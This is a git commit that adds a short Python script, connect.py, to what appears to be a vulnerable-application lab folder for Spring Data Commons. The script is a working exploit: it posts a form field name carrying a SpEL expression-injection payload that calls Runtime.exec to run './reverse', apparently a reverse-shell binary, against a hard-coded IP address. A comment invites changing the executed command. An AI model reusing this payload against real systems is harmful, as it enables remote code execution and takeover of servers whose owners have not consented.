15aa62e79c9df53ede706bf8b56ecb6a1948f442
boson13579 <boson13579@gmail.com>
2023-03-16 16:20:48 +0800

    add

---
+++ Vulapp/Spring_Data_Commons/connect.py
@@ -0,0 +1,11 @@
+import requests
+
+url = "http://140.115.197.136:8081/users"
+
+data = {'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("./reverse")]':'test&password=test&repeatedPassword=test'}
+r = requests.post(url,data = data)
+
+print(r)
+print(r.text)   
+
+#change content of exec
